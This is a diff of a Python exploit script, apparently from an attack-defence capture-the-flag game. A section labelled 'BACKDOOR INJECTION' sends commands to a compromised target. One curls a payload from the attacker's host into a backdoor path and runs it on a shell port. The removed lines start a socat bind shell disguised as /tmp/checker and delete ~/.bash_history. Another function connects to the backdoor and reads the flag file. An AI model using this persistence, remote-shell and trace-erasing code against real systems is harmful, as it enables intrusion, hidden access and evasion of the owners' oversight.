@@ -44,6 +44,7 @@ def exploit(target, port):
     # backdoor injection | DONT CHANGE
     print('='*50 + " BACKDOOR INJECTION 💀 " + '='*50)
 
+    p.sendline(f"rm {BACKDOOR_FILE_PATH}")
     p.sendline(f"curl http://{IP_LOCAL}:8900/fetchchecker -o {BACKDOOR_FILE_PATH}; ls -la {BACKDOOR_FILE_PATH}".encode())
     
     # skip curl output | DONT CHANGE
@@ -54,10 +55,8 @@ def exploit(target, port):
     p.sendline(f"ls -la {BACKDOOR_FILE_PATH}".encode())
     response = p.recv().strip().decode()
     print(f"[+] Response: {response}")
-    
-    p.sendline(b"rm /tmp/checker & cp /bin/socat /tmp/checker")
-    p.sendline(f"/tmp/checker TCP-LISTEN:{SPAWN_SHELL_PORT},reuseaddr,fork EXEC:{BACKDOOR_FILE_PATH},stderr,pty,cfmakeraw,echo=0 &".encode())
-    p.sendline(b"rm ~/.bash_history")
+
+    p.sendline(f"{BACKDOOR_FILE_PATH} {SPAWN_SHELL_PORT} &")
 
     p.close()
     
@@ -87,8 +86,7 @@ def exploit_backdoor(target, portSpawnShell) :
     # exploit goes here
     # start
     r.sendline(f"cat {FLAG_PATH}".encode())
-    r.recvuntil(b"$ ")
-    flag = r.recvline().strip().decode().replace("}.", "}")
+    flag = r.recvline().strip().decode()
     print(flag)
     r.sendline(b"exit")
     r.close()
@@ -100,7 +98,6 @@ def exploit_backdoor(target, portSpawnShell) :
   except Exception as e:
     print(f"[-] Error: {e} ({target})")
     return
-
 
 def process_exploit(target_ip, port):
   try:
